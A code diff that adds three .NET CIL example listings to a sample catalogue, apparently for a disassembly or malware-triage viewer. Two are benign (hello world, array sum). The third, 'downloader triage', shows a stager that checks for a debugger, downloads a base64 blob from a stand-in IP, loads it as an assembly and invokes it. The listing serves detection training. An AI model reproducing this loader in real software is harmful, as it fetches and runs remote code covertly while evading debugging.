@@ -167,6 +167,94 @@ carry_on:
     1142:	c3                   	ret
 """,
     },
+    {
+        'id': 'cil_hello',
+        'name': '.NET: hello world (CIL)',
+        'blurb': 'Locals, a string literal and a static call, as ildasm prints them.',
+        'code': """.method public hidebysig static void Main(string[] args) cil managed
+{
+  .entrypoint
+  .maxstack  2
+  .locals init ([0] string name,
+                [1] string greeting)
+  IL_0000:  call       string [mscorlib]System.Environment::get_UserName()
+  IL_0005:  stloc.0
+  IL_0006:  ldstr      "Hello, "
+  IL_000b:  ldloc.0
+  IL_000c:  call       string [mscorlib]System.String::Concat(string, string)
+  IL_0011:  stloc.1
+  IL_0012:  ldloc.1
+  IL_0013:  call       void [mscorlib]System.Console::WriteLine(string)
+  IL_0018:  ret
+}
+""",
+    },
+    {
+        'id': 'cil_loop',
+        'name': '.NET: summing an array (CIL)',
+        'blurb': 'A for-loop: branches, a back edge, and array element loads.',
+        'code': """.method public hidebysig static int32 Sum(int32[] values) cil managed
+{
+  .maxstack  3
+  .locals init ([0] int32 total,
+                [1] int32 i)
+  IL_0000:  ldc.i4.0
+  IL_0001:  stloc.0
+  IL_0002:  ldc.i4.0
+  IL_0003:  stloc.1
+  IL_0004:  br.s       IL_0010
+  IL_0006:  ldloc.0
+  IL_0007:  ldarg.0
+  IL_0008:  ldloc.1
+  IL_0009:  ldelem.i4
+  IL_000a:  add
+  IL_000b:  stloc.0
+  IL_000c:  ldloc.1
+  IL_000d:  ldc.i4.1
+  IL_000e:  add
+  IL_000f:  stloc.1
+  IL_0010:  ldloc.1
+  IL_0011:  ldarg.0
+  IL_0012:  ldlen
+  IL_0013:  conv.i4
+  IL_0014:  blt.s      IL_0006
+  IL_0016:  ldloc.0
+  IL_0017:  ret
+}
+""",
+    },
+    {
+        'id': 'cil_downloader',
+        'name': '.NET: downloader triage (CIL)',
+        'blurb': 'Call-level detections with evidence: download, decode, load, invoke.',
+        'code': """.method private hidebysig static void Stage() cil managed
+{
+  .maxstack  3
+  .locals init ([0] class [System]System.Net.WebClient client,
+                [1] uint8[] blob,
+                [2] class [mscorlib]System.Reflection.Assembly asm)
+  IL_0000:  call       bool [mscorlib]System.Diagnostics.Debugger::get_IsAttached()
+  IL_0005:  brtrue.s   IL_0040
+  IL_0007:  newobj     instance void [System]System.Net.WebClient::.ctor()
+  IL_000c:  stloc.0
+  IL_000d:  ldloc.0
+  IL_000e:  ldstr      "http://198.51.100.7/update.txt"
+  IL_0013:  callvirt   instance string [System]System.Net.WebClient::DownloadString(string)
+  IL_0018:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
+  IL_001d:  stloc.1
+  IL_001e:  ldloc.1
+  IL_001f:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
+  IL_0024:  stloc.2
+  IL_0025:  ldloc.2
+  IL_0026:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo [mscorlib]System.Reflection.Assembly::get_EntryPoint()
+  IL_002b:  ldnull
+  IL_002c:  ldnull
+  IL_002d:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object, object[])
+  IL_0032:  pop
+  IL_0040:  ret
+}
+""",
+    },
 ]
 
 BY_ID = {e['id']: e for e in EXAMPLES}
